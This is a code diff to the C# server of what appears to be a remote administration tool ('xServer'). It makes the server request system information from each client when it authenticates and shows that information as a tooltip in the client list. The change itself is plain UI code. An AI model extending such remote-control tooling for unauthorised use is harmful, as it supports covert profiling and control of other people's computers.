@@ -1,6 +1,7 @@
 ﻿using System;
 using System.Drawing;
 using System.IO;
+using System.Text;
 using System.Threading;
 using System.Windows.Forms;
 using xServer.Core.Extensions;
@@ -57,6 +58,7 @@ namespace xServer.Core.Commands
                         ShowPopup(client);
 
                     client.Value.IsAuthenticated = true;
+                    new Core.Packets.ServerPackets.GetSystemInfo().Execute(client);
                 }
                 catch
                 {
@@ -411,6 +413,30 @@ namespace xServer.Core.Commands
 
         public static void HandleGetSystemInfoResponse(Client client, GetSystemInfoResponse packet)
         {
+            try
+            {
+                FrmMain.Instance.lstClients.Invoke((MethodInvoker)delegate
+                {
+                    foreach (ListViewItem item in FrmMain.Instance.lstClients.Items)
+                    {
+                        if (item.Tag == client)
+                        {
+                            var builder = new StringBuilder();
+                            for (int i = 0; i < packet.SystemInfos.Length; i += 2)
+                            {
+                                if (packet.SystemInfos[i] != null && packet.SystemInfos[i + 1] != null)
+                                {
+                                    builder.AppendFormat("{0}: {1}\r\n", packet.SystemInfos[i], packet.SystemInfos[i + 1]);
+                                }
+                            }
+                            item.ToolTipText = builder.ToString();
+                        }
+                    }
+                });
+            }
+            catch (Exception)
+            { }
+
             if (client.Value.FrmSi == null)
                 return;
 
